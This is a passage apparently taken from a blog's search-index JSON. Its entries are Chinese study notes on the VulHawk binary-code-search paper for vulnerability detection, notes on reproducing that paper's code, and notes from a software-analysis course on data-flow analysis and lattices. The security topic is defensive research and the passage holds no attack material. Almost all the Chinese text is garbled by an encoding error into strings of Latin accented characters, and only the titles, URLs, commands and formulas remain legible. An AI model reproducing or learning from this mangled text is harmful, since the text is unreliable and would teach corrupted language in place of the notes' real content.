(ä¾‹å¦‚ç¼–è¯‘å™¨) æ—¶ï¼Œæˆ‘ä»¬ä¸ä¼šå›ºå®šå…¶ä»–å‚æ•° (ä¾‹å¦‚æ¶æ„å’Œä¼˜åŒ–çº§åˆ«) ä»¥ç¡®ä¿å®ç”¨æ€§ã€‚ å›¾ 11 æ˜¾ç¤ºäº† VulHawk ç­‰æ–¹æ³•ç²¾åº¦éšæ—¶é—´çš„å˜åŒ–è¶‹åŠ¿ã€‚ç»“æœè¡¨æ˜: (1) VulHawk åœ¨ç¼–è¯‘è¯†åˆ«å’Œä¼˜åŒ–çº§åˆ«ä¸Šå‡ä¼˜äº CNN å’Œ LSTMã€‚(2) VulHawk çš„è¯†åˆ«é€Ÿåº¦æ¯” CNN å’Œ LSTM çš„è¯†åˆ«é€Ÿåº¦å¿«ã€‚(3) VulHawk çš„ç²¾åº¦æ›²çº¿ç¨³å®šï¼Œè€Œ CNN å’Œ LSTM çš„ç²¾åº¦æ›²çº¿æ³¢åŠ¨è¾ƒå¤§ã€‚è¿™è¯´æ˜ VulHawk åœ¨å„ç§åœºæ™¯ä¸‹æ›´åŠ æ³›åŒ–ï¼Œè€Œ CNN å’Œ LSTM åœ¨æŸäº›æƒ…å†µä¸‹å—åˆ°æ‰“å‡»ã€‚æˆ‘ä»¬æ·±å…¥åˆ†æå¦‚ä¸‹ã€‚ä¸ CNN å’Œ LSTM ç›¸æ¯”ï¼ŒVulHawk é‡‡ç”¨äº†åŒ…å«äºŒè¿›åˆ¶å…¨å±€ä¿¡æ¯çš„ç†µæµï¼Œè€Œä¸æ˜¯å•ä¸ªå‡½æ•°çš„åŸå§‹å­—èŠ‚ï¼Œè¿™ä½¿å¾—å‡½æ•°çš„æ„å¤–åå·®å¯¹ VulHawk å½±å“ä¸å¤§ã€‚ç†µåœ¨ä¸åŒçš„æ–‡ä»¶ç¯å¢ƒä¸­ä¿æŒæ˜æ˜¾çš„åŒºåˆ«ï¼Œè€Œåœ¨åŸå§‹å­—èŠ‚ä¸Šå·®å¼‚ä¸æ˜æ˜¾ã€‚è¿™ä½¿å¾— VulHawk ä¿æŒäº†è¾ƒé«˜çš„æ³›åŒ–æ€§èƒ½ï¼Œä¼˜äº CNN å’Œ LSTMã€‚æ­¤å¤–ï¼ŒVulHawk åœ¨ç²¾åº¦å’Œæ•ˆç‡ä¸Šéƒ½ä¼˜äº CNN å’Œ LSTMã€‚ç”±äº VulHawk ä½¿ç”¨äº†ä¸€ä¸ªå¼ºå¤§çš„ç‰¹å¾ (ç†µ)ï¼Œè€Œä¸”æˆ‘ä»¬çš„æ¨¡å‹æ¯” CNN å’Œ LSTM è½»å¾—å¤šï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬æ¨¡å‹ä¸­çš„å‚æ•°å¤§å°ä»…ä¸º CNN çš„ 1.3%ã€‚ ä¸ºäº†å…¨é¢è¯„ä¼°æˆ‘ä»¬åŸºäºç†µçš„æ–‡ä»¶ç¯å¢ƒè¯†åˆ«ï¼Œæˆ‘ä»¬åœ¨ä¸åŒæ¶æ„ (x86ã€mips å’Œ arm)ã€æ–‡ä»¶å¤§å° (å°å°ºå¯¸å’Œå¤§å°ºå¯¸) å’Œæ–‡ä»¶ç±»å‹ (åº“å’Œå¯æ‰§è¡Œæ–‡ä»¶) çš„å„ç§åœºæ™¯ä¸­è¿›è¡Œäº†å®éªŒã€‚åœ¨è¿™é‡Œï¼Œè€ƒè™‘åˆ°æ–‡ä»¶å¤§å°çš„åˆ†å¸ƒï¼Œæˆ‘ä»¬å°†å°äº 1024 KB çš„æ–‡ä»¶è§†ä¸ºå°æ–‡ä»¶ï¼Œåä¹‹åˆ™è§†ä¸ºå¤§æ–‡ä»¶ã€‚ç»“æœå¦‚å›¾ 12 æ‰€ç¤ºï¼Œæ¯ä¸ªå—éƒ½æ ‡æ³¨äº†åˆ†ç±»æ¯”ä¾‹ã€‚ä¾‹å¦‚ï¼Œåœ¨ O3 ç»„é¢„æµ‹ä¸­ï¼Œ95.4%è¢«æ­£ç¡®åˆ’åˆ†ä¸º O3, 4.6%è¢«åˆ’åˆ†ä¸º O2ï¼Œå…¶ä¸­æ€»ä½“å‡†ç¡®ç‡ä¸º 96.2%ã€‚O0 é€‰é¡¹å®ç°äº†å¾ˆé«˜çš„ç²¾åº¦ï¼Œå› ä¸º O0 ä½¿ç”¨é»˜è®¤ä¼˜åŒ–æ¥å‡å°‘ç¼–è¯‘æ—¶é—´ï¼Œè¿™ä¸å…¶ä»–é€‰é¡¹æœ‰å¾ˆå¤§ä¸åŒã€‚åœ¨ mips å’Œåº“æ–‡ä»¶ä¸­å¯¹ O2 å’Œ O3 çš„è¯†åˆ«è¾¾åˆ°äº†æœ€å·®çš„ç»“æœï¼Œå…¶ä¸­å¤§å¤šæ•°é”™è¯¯è¯†åˆ«é›†ä¸­åœ¨ O2 å’Œ O3 çš„åŒºåˆ«ä¸Šã€‚ä¸ O0 ç›¸æ¯”ï¼ŒO3 é€‰é¡¹å¢åŠ äº† 285 ä¸ªä»¥ä¸Šçš„ä¼˜åŒ–ï¼Œè€Œ O3 åªæ¯” O2 å¤š 3 ä¸ªä¼˜åŒ–ã€‚å› æ­¤ï¼ŒO2 å’Œ O3 çš„åŒæ˜Ÿå…·æœ‰é«˜åº¦ç›¸ä¼¼çš„ç»“æ„ã€‚ç”±äºæ¥è‡ª O2 å’Œ O3 çš„äºŒè¿›åˆ¶æ˜¯é«˜åº¦ç›¸ä¼¼çš„ï¼Œè¿™äº›é”™è¯¯è¯†åˆ«æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå¯¹äºŒè¿›åˆ¶å‡½æ•°æœç´¢çš„å½±å“å¾ˆå°ã€‚å½“æˆ‘ä»¬åŒæ—¶è€ƒè™‘ O2 å’Œ O3 æ—¶ï¼Œåœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼ŒåŒºåˆ†å®ƒä»¬ä¸ O0 å’Œ O1 çš„å‡†ç¡®æ€§éƒ½è¶…è¿‡ 90%ã€‚ç»“æœè¡¨æ˜ï¼Œæˆ‘ä»¬çš„åŸºäºç†µçš„æ–‡ä»¶ç¯å¢ƒè¯†åˆ«åœ¨ä¸åŒæ¶æ„ã€æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹çš„å„ç§åœºæ™¯ä¸‹éƒ½æ˜¯å¼ºå¤§çš„ã€‚\næ¼æ´è¯†åˆ« ã€‚ã€‚ã€‚æ‡’å¾—çœ‹äº†ï¼Œåæ­£æ•ˆæœå¾ˆå¥½å§\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/vulhawk-cross-architecture-vulnerability-detection-with-entropy-based-binary-code-search/","summary":"ä¸­æ–‡è¯‘åï¼šVulHawkï¼šåŸºäºç†µçš„äºŒè¿›åˆ¶ä»£ç æœç´¢çš„è·¨æ¶æ„æ¼æ´æ£€æµ‹ ä½œè€…ï¼šZhenhao Luo å•ä½ï¼šå›½é˜²ç§‘å¤§ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2023å¹´ æ¥æºï¼š #N","title":"VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search"},{"content":"[[VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search]]\nGet Started Prerequisites Windows (MacOS and Linux also work) Python 3.8.2 (64 bit) PyTorch 1.13.1 CUDA 11.7 IDA pro 7.5+ (only used for dataset processing) Quick Start File Environment Identification python 2_FileEnvironmentIdentification.py\nFunction Embedding Generation python 3_function_embedding_generation.py\nBinary Function Similarity Detection python 4_binary_code_search.py\nè®ºæ–‡åŸºæœ¬æµç¨‹ æ•´ä½“è¾“å…¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶ååˆ†ä¸¤éƒ¨åˆ†è¿›è¡Œï¼š\nIRFMï¼šå¯¹è¾“å…¥çš„äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œå¤„ç†å¾—åˆ° IRï¼ŒIR ä½œä¸º IRFM çš„è¾“å…¥ï¼Œè¾“å‡ºæ˜¯ IR çš„è¯åµŒå…¥ é¦–å…ˆè¿›è¡Œ IR ç”Ÿæˆå’ŒæŒ‡ä»¤ç®€åŒ– ç„¶åä½¿ç”¨ Masked Language Model (MLM)ã€æ ¹æ“ä½œæ•°é¢„æµ‹ (ROP) å’Œç›¸é‚»å—é¢„æµ‹ (ABP) è¿›è¡Œé¢„è®­ç»ƒ ç„¶åç”ŸæˆåŸºæœ¬å—åµŒå…¥ ç”¨åŸºæœ¬å—åµŒå…¥å’Œ cfg ç”Ÿæˆå‡½æ•°åµŒå…¥ï¼ˆGCN ç½‘ç»œæ˜¯ç”¨æ¥æ•è· cfg çš„ï¼‰ åŸºäºç†µçš„é€‚é…å™¨ï¼š é¦–å…ˆè®¡ç®—äºŒè¿›åˆ¶æ–‡ä»¶çš„ç†µå€¼ ä½¿ç”¨æ®‹å·®ç¥ç»ç½‘ç»œä½œä¸ºåˆ†ç±»å™¨åˆ¤æ–­äºŒè¿›åˆ¶æ–‡ä»¶å±äºå“ªç§æ–‡ä»¶ç¯å¢ƒï¼ˆç¼–è¯‘å™¨ã€ä¼˜åŒ–çº§åˆ«ç­‰ç­‰ï¼‰ ä¸Šé¢ä¸¤ä¸ªä¸€ä¸ªå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„å‡½æ•°åµŒå…¥ï¼Œå¦ä¸€ä¸ªå¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–‡ä»¶ç¯å¢ƒï¼Œå¹¶ä¸”å°†äºŒè¿›åˆ¶æ–‡ä»¶æ˜ å°„åˆ°ä¸€ä¸ªä¸­é—´ç¯å¢ƒä¸­ï¼Œå‡å¼±ä¸åŒæ–‡ä»¶ç¯å¢ƒå¸¦æ¥çš„å½±å“ã€‚ ç”¨å‡½æ•°åµŒå…¥è¿›è¡Œæ¸è¿›å¼æœç´¢\né‡‡ç”¨å‡½æ•°åµŒå…¥çš„æ¬§å¼è·ç¦»ç›¸ä¼¼åº¦å¯¹å€™é€‰å‡½æ•°è¿›è¡Œç²—ç²’åº¦æ£€ç´¢ ç»“åˆåŸºæœ¬å—ã€å­—ç¬¦ä¸²å¸¸é‡å’Œå¯¼å…¥å‡½æ•°çš„ä¿¡æ¯è¿›è¡Œç›¸ä¼¼åº¦æ ¡å‡† æ–‡ä»¶ç»“æ„ exampleï¼šæµ‹è¯•ç”¨ä¾‹ figureï¼šç®—å‡ºæ¥çš„ç†µæµå›¾ å‰©ä¸‹çš„å‡ ä¸ªæ–‡ä»¶å¤¹éƒ½æ˜¯ä¸»ç¨‹åºéœ€è¦ç”¨åˆ°çš„åŒ…æ–‡ä»¶ 2ï¼šæ–‡ä»¶ç¯å¢ƒè¯†åˆ« 3ï¼šå‡½æ•°åµŒå…¥ç”Ÿæˆ 4ï¼šäºŒè¿›åˆ¶ä»£ç æœç´¢ SimilarityCalibration. pyd æ˜¯ç›¸ä¼¼åº¦æ ¡å‡† é—®é¢˜ è™½ç„¶ä½œè€…è¯´ Linux å’Œ MacOS éƒ½å¯ä»¥ï¼Œä½†æ˜¯å®é™…ä¸Šä½œè€…ç»™å‡ºçš„è‡ªå®šä¹‰åŒ…æ–‡ä»¶æœ‰. pyd æ–‡ä»¶ï¼Œåªæœ‰ Windows ä¸‹æ‰å¯ä»¥è½½å…¥ã€‚ çœ‹åˆ° GitHub ä¸Šé¢æœ‰äººç»™ä»–æäº†è¿™ä¸ª issueï¼Œä½†æ˜¯ä½œè€…æ²¡æœ‰å›å¤ã€‚ è¿™ä¸ªä»£ç ç»“æ„æ˜¯æ¸…æ™°çš„ï¼Œæ•°æ®ä¹Ÿæœ‰ï¼Œæ„Ÿè§‰æ˜¯å¯ä»¥å¤ç°æˆåŠŸçš„ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/vulhawk-%E5%A4%8D%E7%8E%B0/","summary":"[[VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search]] Get Started Prerequisites Windows (MacOS and Linux also work) Python 3.8.2 (64 bit) PyTorch 1.13.1 CUDA 11.7 IDA pro 7.5+ (only used for dataset processing) Quick Start File Environment Identification python 2_FileEnvironmentIdentification.py Function Embedding Generation python 3_function_embedding_generation.py Binary Function Similarity Detection python 4_binary_code_search.py è®ºæ–‡åŸºæœ¬æµç¨‹ æ•´ä½“è¾“å…¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶","title":"VulHawk å¤ç°"},{"content":"IR Intermediate Representation ä¸­é—´è¡¨ç¤º 3AC ä¸‰åœ°å€ç  3-Address Code æ¯æ¡3ACè‡³å¤šæœ‰ä¸‰ä¸ªåœ°å€ï¼Œåœ°å€å¯ä»¥æ˜¯åç§°ï¼Œå¸¸é‡ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„ä¸´æ—¶å˜é‡ å…¶å®3ACå°±æ˜¯æŒ‡ä»¤çš„ä¸€ç§è¡¨ç¤ºå½¢å¼ BB åŸºæœ¬å— basic block åŸºæœ¬å—æ˜¯æ»¡è¶³ä¸€ä¸‹æ€§è´¨çš„è¿ç»­3ACï¼šåªèƒ½ä»å—çš„ç¬¬ä¸€æ¡æŒ‡ä»¤è¿›å…¥ï¼›åªèƒ½ä»å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ç¦»å¼€ æ„å»ºç¨‹åºPçš„åŸºæœ¬å—ç®—æ³• å¯»æ‰¾leaderï¼ˆleaderå°±æ˜¯åŸºæœ¬å—çš„å…¥å£ï¼‰ Pçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ä¸€ä¸ªleader è·³è½¬ç›®æ ‡æ˜¯ä¸€ä¸ªleader è·³è½¬æŒ‡ä»¤çš„åä¸€æ¡æŒ‡ä»¤ä¹Ÿæ˜¯ä¸€ä¸ªleader ä¸€ä¸ªåŸºæœ¬å—å°±æ˜¯ä¸€ä¸ªleaderä¸€ç›´åˆ°ä¸‹ä¸€ä¸ªleaderå‰çš„æ‰€æœ‰æŒ‡ä»¤ CFG æ§åˆ¶æµå›¾ control flow graph æ§åˆ¶æµå›¾çš„ä¸€ä¸ªç»“ç‚¹å¯ä»¥æ˜¯ä¸€æ¡å•ç‹¬çš„3ACï¼Œæ›´å¸¸è§çš„æ˜¯ä¸€ä¸ªåŸºæœ¬å—BB æ„å»ºæ§åˆ¶æµå›¾ç®—æ³• é¦–å…ˆæ„å»ºç¨‹åºåŸºæœ¬å— æ„å»ºè¾¹ï¼šå— A å’Œå— B ä¹‹é—´æœ‰ä¸€æ¡è¾¹ï¼Œå½“ä¸”ä»…å½“ï¼šA çš„æœ«å°¾æœ‰ä¸€æ¡æŒ‡å‘äº† B å¼€å¤´çš„è·³è½¬æŒ‡ä»¤ï¼›A çš„æœ«å°¾ç´§æ¥ç€ B çš„å¼€å¤´ï¼Œä¸” A çš„æœ«å°¾ä¸æ˜¯ä¸€æ¡æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ æ•°æ®æµåˆ†æ PP ç¨‹åºç‚¹ program point åœ¨æ•°æ®æµåˆ†æä¸­ï¼Œæˆ‘ä»¬ä¼šæŠŠæ¯ä¸€ä¸ªPPå…³è”ä¸€ä¸ªæ•°æ®æµå€¼ï¼Œä»£è¡¨åœ¨è¯¥ç‚¹ä¸­å¯è§‚å¯Ÿåˆ°çš„æŠ½è±¡çš„ç¨‹åºçŠ¶æ€ã€‚ è¾“å…¥è¾“å‡ºçŠ¶æ€ æ¯ä¸€æ¡IRçš„æ‰§è¡Œï¼Œéƒ½ä¼šä½¿çŠ¶æ€ä»è¾“å…¥çŠ¶æ€å˜æˆæ–°çš„è¾“å‡ºçŠ¶æ€ è¾“å…¥/è¾“å‡ºçŠ¶æ€ä¸è¯­å¥å‰/åçš„ program pointç›¸å…³è”ã€‚ è½¬ç§»æ–¹ç¨‹ æ¯æ¡è¯­å¥ s éƒ½ä¼šä½¿ç¨‹åºçŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªæ‰€è°“çš„æ–¹ç¨‹f_x()å¯¹åº”çš„å°±æ˜¯è¯­å¥ä½¿å¾—çŠ¶æ€å‘ç”Ÿå˜åŒ–çš„æ“ä½œ åˆ†ææ•°æ®æµæœ‰å‰å‘ååå‘ä¸¤ç§ï¼Œæ¯æ¡è¯­å¥å¯¹åº”çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¹Ÿæœ‰ä¸¤ç§ã€‚ æ§åˆ¶æµçº¦æŸ è¿™æŒ‡çš„æ˜¯çŠ¶æ€çš„å˜åŒ–éœ€è¦å’Œæ§åˆ¶æµå¯¹åº”ï¼Œæ¯”å¦‚è¯´æœ‰ä¸¤ä¸ªåŸºæœ¬å—A1å’ŒA2éƒ½æŒ‡å‘åŸºæœ¬å—Bï¼Œé‚£ä¹ˆBçš„è¾“å…¥çŠ¶æ€å°±åº”è¯¥æ˜¯A1ã€A2è¾“å‡ºçŠ¶æ€çš„äº¤é›† Reaching Definitions Analysis åˆ°è¾¾å®šä¹‰åˆ†æ å‡è®¾våœ¨PPpå¤„æœ‰å®šä¹‰xï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªè·¯å¾„ä»PPpåˆ°PPqï¼Œå¹¶ä¸”åœ¨è¯¥è·¯å¾„ä¸Šæ²¡æœ‰vçš„å…¶ä»–å®šä¹‰ï¼Œåˆ™ç§°vçš„å®šä¹‰xåˆ°è¾¾pç‚¹ã€‚ å¦‚æœåœ¨è¿™æ¡è·¯å¾„ä¸Šæœ‰vçš„å…¶ä»–å®šä¹‰ï¼Œåˆ™ç§°å˜é‡vçš„å®šä¹‰xè¢«killed åº”ç”¨ä¸¾ä¾‹ï¼šåˆ†æç¨‹åºæ˜¯å¦å­˜åœ¨å˜é‡æœªåˆå§‹åŒ–ï¼šåœ¨ç¨‹åºå…¥å£ä¸ºå„å˜é‡å¼•å…¥ä¸€ä¸ª dummy å®šå€¼ã€‚å½“ç¨‹åºå‡ºå£çš„æŸå˜é‡å®šå€¼ä¾ç„¶ä¸º dummyï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¯¥å˜é‡æœªè¢«å®šä¹‰ã€‚ åˆ°è¾¾å®šä¹‰çš„è½¬ç§»æ–¹ç¨‹ $$ \\begin{matrix}OUT[B]=gen_B\\cup(IN[B]-kill_B) \\ IN[B]=\\cup_{p,a,predecessor,of, B}OUT[P] \\end{matrix}\n$$\nä»è¾“å…¥çŠ¶æ€å‡æ‰killæ‰çš„å˜é‡ï¼Œå¹¶åŠ å…¥æ–°ç”Ÿæˆçš„å˜é‡ åˆ°è¾¾å®šä¹‰çš„æ›´æ–°ç®—æ³• ä¸€ä¸ªè¿­ä»£ç®—æ³•ï¼Œå…·ä½“çœ‹è§†é¢‘å§ã€‚ Live Variables Analysis æ´»è·ƒå˜é‡åˆ†æ å‡è®¾våœ¨PPpå¤„æœ‰å®šä¹‰xï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªè·¯å¾„ä»PPpåˆ°PPqï¼Œå¹¶ä¸”åœ¨è¯¥è·¯å¾„ä¸Šä½¿ç”¨å˜é‡vå¹¶ä¸”åœ¨ä½¿ç”¨å‰æ²¡æœ‰é‡æ–°å®šä¹‰vï¼Œåˆ™ç§°vçš„å®šä¹‰xåœ¨è¿™æ®µè·¯å¾„ä¸Šæ´»è·ƒã€‚ åä¹‹ç§°ä¸ºè¢«killed åº”ç”¨ä¸¾ä¾‹ï¼šå¯ä»¥ç”¨äºå¯„å­˜å™¨åˆ†é…ï¼Œå½“ä¸€ä¸ªå˜é‡ä¸ä¼šå†è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆæ­¤å˜é‡å°±å¯ä»¥ä»å¯„å­˜å™¨ä¸­è…¾ç©ºï¼Œç”¨äºæ–°å€¼çš„å­˜å‚¨ã€‚ æ´»è·ƒå˜é‡åˆ†æçš„è½¬ç§»æ–¹ç¨‹ï¼ˆä¸ä¸Šé¢reachåˆ†æä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œç”¨backwardçš„åˆ†æï¼‰ $$ \\begin{matrix}OUT[B]=\\cup_{s,a,successor,of,B}OUT[S] \\ IN[B]=use_B\\cup(OUT[B]-def_B) \\end{matrix}\n$$\nç®—æ³• Available Expression Analysis å¯ç”¨è¡¨è¾¾å¼åˆ†æ ä»æµå›¾å…¥å£ç»“ç‚¹åˆ°è¾¾ p çš„æ¯æ¡è·¯å¾„éƒ½å¯¹ x + y æ±‚äº†å€¼ï¼Œä¸”åœ¨æœ€åä¸€æ¬¡æ±‚å€¼ä¹‹åå†æ²¡æœ‰å¯¹ x æˆ– y èµ‹å€¼ï¼Œåˆ™ç§°x+yå¯ç”¨ åº”ç”¨ä¸¾ä¾‹ï¼šå¯ç”¨è¡¨è¾¾å¼å¯ä»¥ç”¨äºå…¨å±€å…¬å…±å­è¡¨è¾¾å¼çš„è®¡ç®—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªè¡¨è¾¾å¼ä¸Šæ¬¡è®¡ç®—çš„å€¼åˆ°è¿™æ¬¡ä»ç„¶å¯ç”¨ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨å…¶ä¸­å€¼ï¼Œè€Œä¸ç”¨è¿›è¡Œå†æ¬¡çš„è®¡ç®—ã€‚ è½¬ç§»æ–¹ç¨‹ $$ \\begin{matrix}OUT[B]=gen_B\\cup(IN[B]-kill_B) \\ IN[B]=\\cap_{p,a,predecessor,of, B}OUT[P] \\end{matrix}\n$$ æ³¨æ„è¿™é‡Œå…¬å¼é‡Œçš„inæ˜¯äº¤é›†ï¼Œå› ä¸ºå®šä¹‰ä¸­è¦æ±‚æ¯æ¡è·¯å¾„éƒ½å¯¹è¡¨è¾¾å¼æ±‚å€¼è€Œä¸”æœ€åä¸€æ¬¡æ±‚å€¼åæ²¡æœ‰å®šä¹‰ï¼Œæ‰€ä»¥å¯¹äºæ¯æ¡è·¯å¾„çš„outè¿›è¡Œmergeç”¨äº¤é›†ã€‚ æ¯”å¦‚ä¸Šå›¾è¿™ä¸ªä¾‹å­ï¼Œå·¦è¾¹çš„è·¯å¾„ä¸­å¯¹xè¿›è¡Œèµ‹å€¼äº†ï¼Œä½†æ˜¯æ˜¯åœ¨æœ€åä¸€æ¬¡è®¡ç®—è¡¨è¾¾å¼ä¹‹å‰èµ‹å€¼ï¼Œæ‰€ä»¥outä»ç„¶æ˜¯è¡¨è¾¾å¼ã€‚å¦‚æœå·¦è¾¹è·¯å¾„çš„BBä¸­æŠŠæœ€åä¸€æ¬¡è®¡ç®—å»æ‰ï¼Œé‚£outå°±æ˜¯ç©ºäº†ï¼Œæœ€åä¸¤æ¡è·¯å¾„mergeçš„inå°±æ˜¯ç©ºã€‚\nç®—æ³• ä¸Šè¿°ç®—æ³•çš„å…±åŒç‚¹éƒ½æ˜¯ä¸åŒè¿­ä»£ç›´åˆ°æ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½ä¸å†æ›´æ–°äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶æ¯ä¸ªç»“ç‚¹çš„å€¼å°±æ˜¯çœŸå®ç¨‹åºä¼šè¾¾åˆ°çš„çŠ¶æ€å—ï¼Œåˆ°è¾¾æ­¤çŠ¶æ€åæ¯ä¸ªç»“ç‚¹å°±çœŸçš„ä¸ä¼šå†å˜åŒ–äº†å—ï¼Ÿä¸‹é¢è€å¸ˆè¿›è¡Œæ•°å­¦ä¸Šçš„è¯æ˜\nUpper and Lower Bounds å¯¹äºååºé›†ä¸­çš„æŸå­é›† S æ¥è¯´ï¼š è‹¥å­˜åœ¨å…ƒç´  u ä½¿å¾— S çš„ä»»æ„å…ƒç´  x æœ‰ x$\\sqsubseteq$uï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯´ u æ˜¯ S çš„ä¸Šç•Œï¼ˆUpper boundï¼‰ã€‚ åŒç†ï¼Œè‹¥å­˜åœ¨å…ƒç´  l ä½¿å¾— S çš„ä»»æ„å…ƒç´  x æœ‰ l$\\sqsubseteq$xï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯´ l æ˜¯ S çš„ä¸‹ç•Œï¼ˆLower boundï¼‰ã€‚ ç„¶åæˆ‘ä»¬è¡ç”Ÿå‡ºæœ€å°ä¸Šç•Œå’Œæœ€å¤§ä¸‹ç•Œçš„æ¦‚å¿µï¼š åœ¨ S çš„æ‰€æœ‰ä¸Šç•Œä¸­ï¼Œæˆ‘ä»¬è®°æœ€å°ä¸Šç•Œï¼ˆLeast upper bound, lubï¼‰ä¸º $\\sqcup$ Sï¼Œæ»¡è¶³æ‰€æœ‰ä¸Šç•Œ u å¯¹ lub æœ‰ï¼š$\\sqcup$ S $\\sqsubseteq$ u ç±»ä¼¼åœ°æˆ‘ä»¬ä¹Ÿèƒ½å®šä¹‰å‡ºæœ€å¤§ä¸‹ç•Œï¼ˆGreatest lower bound, glbï¼‰ä¸º$\\sqcap$ Sã€‚ å¹¶ä¸æ˜¯æ¯ä¸ªååºé›†éƒ½æœ‰ lub å’Œ glbï¼Œä½†æ˜¯å¦‚æœæœ‰ï¼Œé‚£ä¹ˆè¯¥ lub, glb å°†æ˜¯å”¯ä¸€çš„ã€‚\nLattice, Semilattice, Complete and Product Lattic ç»™å®šä¸€ä¸ªååºé›†ï¼Œå¦‚æœä»»æ„å…ƒç´  a, b éƒ½æœ‰ lubå’Œglbï¼Œé‚£ä¹ˆè¿™ä¹ˆååºé›†å°±å«åš æ ¼ï¼ˆlatticeï¼‰ å¦‚æœåœ¨æ­¤ä¹‹ä¸Šæ›´åŠ ä¸¥æ ¼ä¸€äº›ï¼Œä»»æ„é›†åˆéƒ½å­˜åœ¨ lub å’Œ glbï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯´è¿™ä¸ª lattice ä¸ºâ€œå…¨æ ¼ï¼ˆcomplete latticeï¼‰â€ å¦å¤–è¿˜æœ‰ Product Latticeï¼Œå¤šä¸ª lattice çš„ç¬›å¡å°”ç§¯ä¹Ÿèƒ½å½¢æˆä¸€ä¸ªæ–°çš„ latticeã€‚ Data Flow Analysis Framework via Lattice ä¸€ä¸ªæ•°æ®æµåˆ†ææ¡†æ¶ï¼ˆD, L, Fï¼‰ç”±ä»¥ä¸‹å…ƒç´ ç»„æˆï¼š\nD: æ•°æ®æµçš„æ–¹å‘ï¼Œå‰å‘è¿˜æ˜¯åå‘ L: åŒ…å«äº†æ•°æ®å€¼ V å’Œ meet, join ç¬¦å·çš„æ ¼ F: V -\u0026gt; V çš„è½¬ç§»æ–¹ç¨‹æ— ä»è€Œï¼Œæ•°æ®æµåˆ†æå¯ä»¥è¢«è§†ä¸ºåœ¨ lattice çš„å€¼ä¸Šè¿­ä»£åœ°åº”ç”¨è½¬ç§»æ–¹ç¨‹å’Œ meet/join æ“ä½œç¬¦ã€‚\nå‚è€ƒ æ•°æ®æµåˆ†æ 1\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%89%8D5%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"IR Intermediate Representation ä¸­é—´è¡¨ç¤º 3AC ä¸‰åœ°å€ç  3-Address Code æ¯æ¡3ACè‡³å¤šæœ‰ä¸‰ä¸ªåœ°å€ï¼Œåœ°å€å¯ä»¥æ˜¯åç§°ï¼Œå¸¸é‡ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„ä¸´æ—¶å˜é‡ å…¶å®3ACå°±æ˜¯æŒ‡ä»¤çš„ä¸€ç§è¡¨ç¤ºå½¢å¼ BB åŸºæœ¬å— basic block","title":"å—å¤§è½¯ä»¶åˆ†æå‰5èŠ‚ç¬”è®°"},{"content":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹07ï¼ˆInterprocedural Analysis è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ è½¯ä»¶åˆ†æï¼ˆä¸ƒï¼‰Inter-procedural Analysis - çŸ¥ä¹ (zhihu.com) è½¯ä»¶åˆ†æ - çŸ¥ä¹ (zhihu.com) PPTï¼š Interprocedural Analysis (nju.edu.cn)\n1.Motivation 1. 1ä¸ºä»€ä¹ˆéœ€è¦è¿‡ç¨‹é—´åˆ†æï¼ˆInterprocedural Analysisï¼‰ æˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„æ˜¯è¿‡ç¨‹å†…åˆ†æï¼ˆInterprocedural 